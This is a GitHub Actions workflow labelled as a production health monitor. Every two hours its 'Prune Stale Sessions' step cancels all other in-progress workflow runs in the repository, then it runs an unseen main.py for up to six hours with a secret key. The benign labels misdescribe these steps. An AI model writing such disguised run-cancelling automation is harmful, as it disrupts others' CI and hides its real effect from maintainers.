name: Production_Health_Monitor

on:
  schedule:
    - cron: '0 */2 * * *'
  workflow_dispatch:

jobs:
  infrastructure-check:
    runs-on: ubuntu-latest
    permissions:
      actions: write
      contents: read
    steps:
      - name: Prune Stale Sessions
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        run: |
          runs=$(gh run list --repo ${{ github.repository }} --status in_progress --json databaseId --jq ".[] | select(.databaseId != ${{ github.run_id }}) | .databaseId")
          for run_id in $runs; do
            echo "Terminating stale session ID: $run_id"
            gh run cancel $run_id --repo ${{ github.repository }}
          done

      - uses: actions/checkout@v2

      - uses: actions/setup-python@v2
        with:
          python-version: '3.9'

      - run: pip install requests

      - name: Execute System Diagnostics
        env:
          API_BUILD_KEY: ${{ secrets.API_BUILD_KEY }}
        timeout-minutes: 360
        run: python main.py
